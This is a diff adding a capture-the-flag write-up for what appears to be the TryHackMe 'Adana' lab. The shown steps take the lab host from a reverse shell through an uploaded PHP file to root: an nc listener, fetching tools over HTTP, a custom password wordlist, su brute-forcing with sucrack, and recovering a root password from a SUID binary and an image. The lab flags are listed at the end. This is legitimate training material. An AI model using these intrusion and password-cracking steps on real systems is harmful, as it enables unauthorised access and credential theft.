@@ -247,3 +247,252 @@ http://subdomain.adana.thm
 
 ┌──(witty㉿kali)-[~]
 └─$ tac /etc/hosts
+10.10.27.15 subdomain.adana.thm
+
+now give permission to revshell.php
+
+ftp> chmod 777 revshell.php
+200 SITE CHMOD command ok.
+
+┌──(witty㉿kali)-[~]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.27.15] 45874
+bash: cannot set terminal process group (936): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/subdomain$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+</bash')" || /usr/bin/script -qc /bin/bash /dev/null
+www-data@ubuntu:/var/www/subdomain$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/var/www/subdomain$ ls
+ls
+announcements	 wp-admin	       wp-includes	  wp-signup.php
+index.php	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
+license.txt	 wp-comments-post.php  wp-load.php	  xmlrpc.php
+readme.html	 wp-config.php	       wp-login.php
+revshell.php	 wp-content	       wp-mail.php
+wp-activate.php  wp-cron.php	       wp-settings.php
+www-data@ubuntu:/var/www/subdomain$ cd ..
+cd ..
+www-data@ubuntu:/var/www$ ls
+ls
+html  subdomain
+www-data@ubuntu:/var/www$ cd html
+cd html
+www-data@ubuntu:/var/www/html$ ls
+ls
+announcements	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
+index.php	 wp-comments-post.php  wp-load.php	  wwe3bbfla4g.txt
+license.txt	 wp-config.php	       wp-login.php	  xmlrpc.php
+readme.html	 wp-content	       wp-mail.php
+wp-activate.php  wp-cron.php	       wp-settings.php
+wp-admin	 wp-includes	       wp-signup.php
+www-data@ubuntu:/var/www/html$ cat wwe3bbfla4g.txt
+cat wwe3bbfla4g.txt
+THM{343a7e2064a1d992c01ee201c346edff}
+
+www-data@ubuntu:/var/www/html$ cd /home
+cd /home
+www-data@ubuntu:/home$ ls
+ls
+hakanbey
+www-data@ubuntu:/home$ cd hakanbey
+cd hakanbey
+bash: cd: hakanbey: Permission denied
+
+www-data@ubuntu:/home$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+
+123adana
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sed 's/^/123adana/' wordlist.txt > 123_wordlist.txt
+                                                         
+┌──(witty㉿kali)-[~/Downloads]
+└─$ more 123_wordlist.txt            
+123adana123456
+123adana12345
+
+the command takes the content of "wordlist.txt", adds "123adana" at the beginning of each line, and saves the modified content in a new file named "123_wordlist.txt"
+
+http://archive.ubuntu.com/ubuntu/pool/universe/s/sucrack/sucrack_1.2.3-5_amd64.deb
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.27.15 - - [19/Jul/2023 20:08:51] "GET /sucrack_1.2.3-5_amd64.deb HTTP/1.1" 200 -
+
+www-data@ubuntu:/home$ cd /tmp
+cd /tmp
+www-data@ubuntu:/tmp$ wget http://10.8.19.103/sucrack_1.2.3-5_amd64.deb
+wget http://10.8.19.103/sucrack_1.2.3-5_amd64.deb
+--  http://10.8.19.103/sucrack_1.2.3-5_amd64.deb
+Connecting to 10.8.19.103:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17860 (17K) [application/vnd.debian.binary-package]
+Saving to: 'sucrack_1.2.3-5_amd64.deb'
+
+sucrack_1.2.3-5_amd 100%[===================>]  17.44K  90.8KB/s    in 0.2s    
+
+(90.8 KB/s) - 'sucrack_1.2.3-5_amd64.deb' saved [17860/17860]
+
+www-data@ubuntu:/tmp$ dpkg -x sucrack_1.2.3-5_amd64.deb sucrack
+dpkg -x sucrack_1.2.3-5_amd64.deb sucrack
+www-data@ubuntu:/tmp$ ls
+ls
+sucrack  sucrack_1.2.3-5_amd64.deb
+
+www-data@ubuntu:/tmp$ wget http://10.8.19.103/123_wordlist.txt
+wget http://10.8.19.103/123_wordlist.txt
+--  http://10.8.19.103/123_wordlist.txt
+Connecting to 10.8.19.103:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 803930 (785K) [text/plain]
+Saving to: '123_wordlist.txt'
+
+123_wordlist.txt    100%[===================>] 785.09K   299KB/s    in 2.6s    
+
+(299 KB/s) - '123_wordlist.txt' saved [803930/803930]
+
+www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -h
+./sucrack -h
+sucrack 1.2.3 (LINUX) - the su cracker
+Copyright (C) 2006  Nico Leidecker; nfl@portcullis-security.com
+
+ Usage: ./sucrack [-char] [-w num] [-b size] [-s sec] [-u user] [-l rules] wordlist
+
+ The word list can either be an existing file or stdin. In that case, use '-' instead of a file name
+
+ Options:
+   h       : print this message
+   a       : use ansi escape codes for nice looking statistics
+   s sec   : statistics display interval
+   c       : only print statistics if a key other than `q' is pressed
+   r       : enable rewriter
+   w num   : number of worker threads running with
+   b size  : size of word list buffer
+   u user  : user account to su to
+   l rules : specify rewriting rules; rules can be:
+               A = all characters upper case
+               F = first character upper case
+               L = last character upper case
+               a = all characters lower case
+               f = first character lower case
+               l = last character lower case
+               D = prepend digit
+               d = append digit
+               e = 1337 characters
+               x = all rules
+
+ Environment Variables:
+   SUCRACK_SU_PATH      : The path to su (usually /bin/su or /usr/bin/su)
+
+   SUCRACK_AUTH_FAILURE : The message su returns on an authentication
+                          failure (like "su: Authentication failure" or "su: Sorry")
+   SUCRACK_AUTH_SUCCESS : The message that indicates an authentication
+                          success. This message must not be a password
+                          listed in the wordlist (default is "SUCRACK_SUCCESS")
+
+ Example:
+   export SUCRACK_AUTH_SUCCESS="sucrack_says_hello"
+   ./sucrack -a -w 20 -s 10 -u root -rl AFLafld dict.txt
+
+www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 100 -b 500 -u hakanbey /tmp/123_wordlist.txt
+<ack -w 100 -b 500 -u hakanbey /tmp/123_wordlist.txt
+password is: 123adanasubaru
+
+www-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey
+Password: 123adanasubaru
+
+hakanbey@ubuntu:/tmp/sucrack/usr/bin$ cd /home/hakanbey
+hakanbey@ubuntu:~$ ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt   website
+hakanbey@ubuntu:~$ cat user.txt
+THM{8ba9d7715fe726332b7fc9bd00e67127}
+
+hakanbey@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null
+/bin/fusermount
+/bin/su
+/bin/umount
+/bin/mount
+/bin/ping
+/usr/local/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/arping
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/binary
+/usr/bin/at
+/usr/bin/newgrp
+/usr/sbin/pppd
+/usr/sbin/exim4
+
+hakanbey@ubuntu:~$ ltrace /usr/bin/binary
+strcat("war", "zone")                            = "warzone"
+strcat("warzone", "in")                          = "warzonein"
+strcat("warzonein", "ada")                       = "warzoneinada"
+strcat("warzoneinada", "na")                     = "warzoneinadana"
+printf("I think you should enter the cor"...)    = 52
+__isoc99_scanf(0x562d567b3edd, 0x7fff9ed60a60, 0, 0I think you should enter the correct string here ==>
+warzoneinadana
+) = 1
+strcmp("warzoneinadana", "warzoneinadana")       = 0
+fopen("/root/hint.txt", "r")                     = 0
+__isoc99_fscanf(0, 0x562d567b3edd, 0x7fff9ed60a80, 1 <no return ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+hakanbey@ubuntu:~$ /usr/bin/binary
+I think you should enter the correct string here ==>warzoneinadana
+Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
+
+Copy /root/root.jpg ==> /home/hakanbey/root.jpg
+
+hakanbey@ubuntu:~$ xxd root.jpg
+00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
+00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM
+00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275  ...=y._..m..i..u
+
+https://cyberchef.io/#recipe=From_Hex('Auto')To_Base85('!-u',false)&input=ZmVlOTlkM2Q3OTE4NWZmYzgyNmRkZjFjNjlhY2MyNzU
+
+using hint
+
+fee99d3d79185ffc826ddf1c69acc275
+
+root:Go0odJo0BbBro0o
+
+hakanbey@ubuntu:~$ su root
+Password: Go0odJo0BbBro0o
+
+root@ubuntu:/home/hakanbey# cd /root
+root@ubuntu:~# ls
+hint.txt  root.jpg  root.txt
+root@ubuntu:~# cat root.txt
+THM{c5a9d3e4147a13cbd1ca24b014466a6c}
+root@ubuntu:~# cat hint.txt
+Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
+```
+![[Pasted image 20230719182422.png]]
+Web flag ?
+User flag ?
+Root flag ?
+From HEX, To Base85
+
+## Flags / Answers
+- ***THM{343a7e2064a1d992c01ee201c346edff}***
+- ***THM{8ba9d7715fe726332b7fc9bd00e67127}***
+- ***THM{c5a9d3e4147a13cbd1ca24b014466a6c}***
+
+## Notes / Lessons Learned
+[[Uranium CTF]]
+
